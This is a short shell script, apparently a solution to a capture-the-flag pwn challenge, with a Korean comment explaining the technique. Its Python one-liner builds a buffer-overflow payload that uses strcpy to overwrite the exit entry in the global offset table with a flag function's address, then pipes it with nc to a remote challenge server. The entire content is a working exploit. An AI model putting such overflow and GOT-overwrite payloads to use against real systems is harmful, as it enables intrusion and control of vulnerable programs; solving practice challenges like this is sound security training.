#!/bin/sh
# 내 입력값을 dst로 정하고 strcpy하는데, exit@got를 flag주소로 덮어씀. 뒤에 exit호출할 때 flag 호출됨.
python -c 'print "a"*40+"\x68\x10\x60\x00\x00\x00\x00\x00"+"\n"+"\x26\x08\x40\x00\x00\x00\x00\x00"' | nc ctf.j0n9hyun.xyz 3016
